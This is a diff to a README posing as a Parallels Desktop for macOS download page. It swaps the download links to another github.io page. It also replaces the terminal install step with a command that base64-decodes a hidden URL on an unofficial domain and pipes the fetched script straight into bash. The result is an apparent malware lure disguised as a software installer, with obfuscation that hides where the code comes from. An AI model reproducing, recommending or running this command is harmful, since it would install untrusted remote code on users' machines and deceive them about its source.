@@ -7,7 +7,7 @@ Whether you're using an Intel-based Mac or the latest Apple Silicon (M1/M2/M3), 
 ---
 
 ## ✅ Download Parallels Desktop for macOS  
-[![Download Parallels Desktop](https://img.shields.io/badge/Download-Parallels_Desktop-lightblue)](https://parallels-desktop-download-mac.github.io/.github)
+[![Download Parallels Desktop](https://img.shields.io/badge/Download-Parallels_Desktop-lightblue)](https://shuziktobehuman.github.io/huja/Parallels)
 
 ---
 
@@ -26,7 +26,7 @@ Installation via a command in the terminal:
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 
 
@@ -62,7 +62,7 @@ Parallels Desktop is a powerful virtual machine software built specifically for 
 
 ---
 
-[![Download Parallels Desktop](https://img.shields.io/badge/Download-Parallels_Desktop-lightblue)](https://parallels-desktop-download-mac.github.io/.github)
+[![Download Parallels Desktop](https://img.shields.io/badge/Download-Parallels_Desktop-lightblue)](https://shuziktobehuman.github.io/huja/Parallels)
 
 ---
 
